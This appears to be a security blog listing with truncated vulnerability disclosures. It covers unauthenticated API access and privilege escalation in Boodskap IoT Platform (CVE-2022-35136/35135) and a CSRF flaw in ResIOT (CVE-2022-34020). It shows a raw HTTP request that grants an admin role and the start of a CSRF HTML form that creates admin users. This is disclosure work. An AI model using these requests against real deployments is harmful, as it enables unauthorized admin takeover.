CVE-2022-35136:  Boodskap IoT Platform v4.4.9-02 allows attackers to make unauthenticated API requests. CVE-2022-35135:  Boodskap IoT Platform v4.4.9-02 allows attackers to escalate privileges  via a crafted request sent to /api/user/upsert/<uuid>.  The platform successfully processes API requests even without valid cookies.For example, the following request to update user profile is processed, even though the request does not have any cookie/api key. (Cookie header is blank in the request) Since API requests to the platform are not authenticated, a user can assign themselves an admin role, by sending a request to  http://192.168.72.157/api/user/upsert/<userid>  endpoint. HTTP Request: POST /api/user/upsert/8c34fa03- 706a-4dc7-b484-cd8e0c329c81 HTTP/1.1 Host: 192.168.72.157 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0 Accept: \*/\* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Conten...

### [CVE-ID: CVE-2022-34020](https://securityblog101.blogspot.com/2022/09/cve-2022-34020.html)

[October 12, 2022](https://securityblog101.blogspot.com/2022/09/cve-2022-34020.html "permanent link")

Cross Site Request Forgery (CSRF) vulnerability in ResIOT ResIOT IOT Platform + LoRaWAN Network Server through 4.1.1000114 allows attackers to add new admin users to the platform or other unspecified impacts. ResIOT® IOT Platform + LoRaWAN Network Server (on-premise version) V.4.1.1000114  does not use any CSRF protection mechanism. It is possible for an attacker to launch CSRF attacks against users of the platform. An attacker can abuse CSRF to perform actions, such as creating a user on the platform. For this, the attacker can prepare a HTML form such as follows, host it online and send the form's link to a ResIoT admin user. <html>   <body>   <script>history.pushState('', '', '/')</script>     <form action=" http://172.20.32.1: 8088/UserorgApi/?domain=172. 20.32.1&protocol=http:&email= test111@gmail.com&firstname= test&lastname=one&password= V79NrFNCAxZNXtg&phone= 77777777777 " method="POST...
